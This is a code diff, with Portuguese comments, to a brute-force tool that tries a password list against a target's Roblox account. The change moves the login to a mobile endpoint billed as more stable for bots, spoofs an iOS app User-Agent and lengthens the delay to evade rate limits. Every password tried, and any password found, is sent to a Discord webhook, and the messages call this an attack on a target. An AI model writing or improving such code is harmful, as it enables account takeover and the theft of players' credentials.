@@ -26,41 +26,37 @@ async function sendDiscordMessage(content) {
     }
 }
 
-// Função para tentar Login no Roblox (Método Mais Simples e Direto)
+// Função para tentar Login no Roblox (USANDO MOBILE API)
 async function tryRobloxLogin(email, password) {
-    // Usar a API de login clássica
-    const loginUrl = "https://www.roblox.com/users/login";
-
-    // Headers mínimos necessários
-    const headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'X-Requested-With': 'XMLHttpRequest'
-    };
+    // Usar a API Mobile que é mais estável para bots
+    const loginUrl = "https://www.roblox.com/mobileapi/userinfo";
 
     try {
-        // Tenta fazer o POST direto sem precisar de GET anterior (alguns bots fazem assim)
+        // Fazer o POST direto para a Mobile API
         const response = await axios.post(loginUrl, {
             username: email,
             password: password
         }, {
-            headers: headers,
-            timeout: 5000
+            headers: {
+                'User-Agent': 'RobloxApp/1 (iOS; 12.0)',
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            timeout: 8000
         });
 
-        // Se retornar ID, é sucesso
-        if (response.data && response.data.id) {
+        // Se a resposta tiver 'userId' e 'username', foi sucesso
+        if (response.data.userId && response.data.username) {
             return {
                 success: true,
                 username: response.data.username,
-                userId: response.data.id
+                userId: response.data.userId
             };
         } else {
-            // Erro comum
+            // Erro comum na Mobile API
             return {
                 success: false,
-                error: response.data.error || "Erro Desconhecido"
+                error: response.data.message || "Erro Desconhecido"
             };
         }
 
@@ -95,7 +91,7 @@ async function startBruteForce(email) {
     }
 
     console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
-    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);
+    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}\n*Usando API Mobile...*`);
 
     let found = false;
 
@@ -111,13 +107,13 @@ async function startBruteForce(email) {
             await sendDiscordMessage(msg);
             console.log("ENCONTRADA:", password);
         } else {
-            // Enviar o erro exato no Discord para vermos o que acontece
+            // Enviar erro resumido
             const errorMsg = `❌ **Tentativa Falhada**\n**Senha:** ${password}\n**Erro:** ${result.error}`;
             await sendDiscordMessage(errorMsg);
         }
 
-        // Pausa curta
-        await new Promise(r => setTimeout(r, 1500)); 
+        // Pausa para não bloquear o Email no Roblox (Rate Limit)
+        await new Promise(r => setTimeout(r, 2000)); 
     }
 
     if (!found) {
